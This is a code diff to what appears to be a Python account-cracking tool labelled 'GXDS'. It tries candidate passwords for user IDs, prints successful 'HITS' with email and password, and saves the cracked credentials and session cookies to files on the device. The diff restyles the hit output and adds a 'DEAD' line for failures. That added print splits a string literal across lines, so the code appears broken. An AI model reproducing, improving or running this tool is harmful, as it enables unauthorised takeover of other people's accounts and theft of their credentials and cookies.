@@ -534,7 +534,7 @@ def result(oks):
 # API
 def gxds_files(uid, pxss):
     global oks, loop, cps, ugen
-    sys.stdout.write(f"\r  {dg}[GXDS]{lr} {loop} |{lgr} {str(len(oks))}");sys.stdout.flush()
+    sys.stdout.write(f"\r  {dg}[GXDS]{lr} {loop}{dg} |{lgr} {str(len(oks))}");sys.stdout.flush()
     session = requests.Session()
     try:
         for ps in pxss:
@@ -589,25 +589,14 @@ def gxds_files(uid, pxss):
                     ]
                 )
                 xcki = coki.split("sb=")[1]
-                print(
-                    "\r\r\n\033[1;30m————————————————————————————————————————"
-                    "\033[1;32m  [GXDS-HITS]"
-                    + "\n\033[0;32m  EMAIL : "
-                    + "\033[0;33m"
-                    +   uid
-                    + "\n\033[0;32m  PASS  : "
-                    + "\033[0;33m"
-                    +    ps
-                    + "\n\033[1;32m  YEAR  : "
-                    + "\033[0;33m"
-                    +    yxxr(uid)
-                    + "\033[1;30m————————————————————————————————————————"
-                )
+                print("\r\r\033[1;32m  [GXDS-HITS] " + uid + ":" + ps + " -\033[0;35m " + yxxr(uid))
                 open("/sdcard/gxds-ok.txt", "a").write(uid + "|" + ps + "\n")
                 open("/sdcard/gxds-cookies.txt", "a").write(xcki + "\n")
                 oks.append(uid)
                 break
             else:
+                print("\r\r\033[0;31m  [GXDS-DEAD] " + uid + ":" + ps + " -\033[0;35m
+              " + yxxr(uid))
                 continue
         loop += 1
     except:
